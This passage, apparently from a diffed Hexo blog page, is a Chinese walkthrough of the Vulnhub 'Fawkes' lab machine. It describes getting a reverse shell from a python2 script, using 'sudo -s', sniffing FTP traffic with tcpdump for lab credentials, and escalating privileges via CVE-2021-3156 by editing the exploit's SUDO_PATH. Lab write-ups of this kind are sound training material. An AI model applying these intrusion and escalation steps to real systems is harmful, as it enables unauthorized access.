class="line">s.close()</span><br></pre></td></tr></table></figure>
+
+<p>使用python2执行</p>
+<p>反弹shell！</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201161248654.jpg"></p>
+<p>python在目标主机上也无法使用，那么只好使用sh进行升级shell了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -i</span><br></pre></td></tr></table></figure>
+
+<p>结果sudo -l一看，好家伙，直接是<code>nopasswd:all</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-边境突破"><a href="#4-边境突破" class="headerlink" title="4.边境突破"></a>4.边境突破</h3><p>但是我们可以看一些IP的配置，这台主机的ip明显不是 <code>192.168.0.100</code>那么代表还有一台主机需要我们进行攻击</p>
+<p>继续进行收集信息，在<code>harry</code>用户家目录下发现了隐藏文件<code>mycred.txt</code>这个有可能就是密码</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201161259585.jpg"></p>
+<p>然后退出ncshell，使用ssh连接<code>2222</code>端口，因为<code>22</code>无法连接，连接成功</p>
+<p>依然，我们发现了这两个文件 <code>/.dockerenv</code>以及 <code>/proc/1/cgroup </code>可以确认这是个docker容器</p>
+<p>然后我在<code>root</code>用户目录下找到了 <code>notes.txt</code>，他告诉我们需要抓包才21端口，在数据包中分析一个用户名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201161306826.jpg"></p>
+<p>使用<code>tcpdump</code>工具，进行抓包</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 port 21</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201161310121.jpg"></p>
+<p>得到数据包，分析，得出用户是 <code>neville</code>以及他的密码 <code>bL!Bsg3k</code></p>
+<p>这时候进行登录 <code>192.168.0.100</code>，登录成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201161318049.jpg"></p>
+<h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h3><p><code>CVE-2021-3156</code>针对debian操作系统的<code>sudo</code>堆溢出漏洞</p>
+<p>下载以下文件</p>
+<p>然后修改其中的SUDO_PATH位置，正常的sudo都在 <code>/usr/bin/sudo</code>，而这台靶机的sudo位置在 <code>/usr/local/bin/sudo</code>可能是靶机作者故意而为之</p>
+<p>最终执行提权代码，提权成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201161402577.jpg"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">YiFang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/01/17/fawkes/index/">http://example.com/2022/01/17/fawkes/index/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">YiFang</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Vulnhub-Hard/">Vulnhub-Hard</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201161016302.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/17/hacksudo/index/"><img class="prev-cover" src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201122110913.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">HackSudo</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/17/evilbox/index/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201122106227.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">EvilBox</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/01/17/hardsocnet2/index/" title="Hard-Socnet2"><img class="cover" src="https://cdn.jsdelivr.net/gh/yifaang/picture@master/202201122112553.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-17</div><div class="title">Hard-Socnet2</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnhub-Fawkes%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%BF%87%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">Vulnhub Fawkes靶机打靶过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">靶机详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%9A%BE%E5%BA%A6"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.难度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%BA%94%E7%94%A8%E6%8A%80%E6%9C%AF"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.应用技术</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%BC%80%E5%A7%8B"><span class="toc-number">1.2.</span> <span class="toc-text">攻击开始</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.3.</span> <span class="toc-text">3.信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.2.4.</span> <span class="toc-text">3.堆栈溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BE%B9%E5%A2%83%E7%AA%81%E7%A0%B4"><span class="toc-number">1.2.5.</span> <span class="toc-text">4.边境突破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.6.</span> <span class="toc-text">5.提权</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By YiFang</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://example.com/2022/01/17/fawkes/index/'
+    this.page.identifier = '2022/01/17/fawkes/index/'
+    this.page.title = 'Fawkes'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
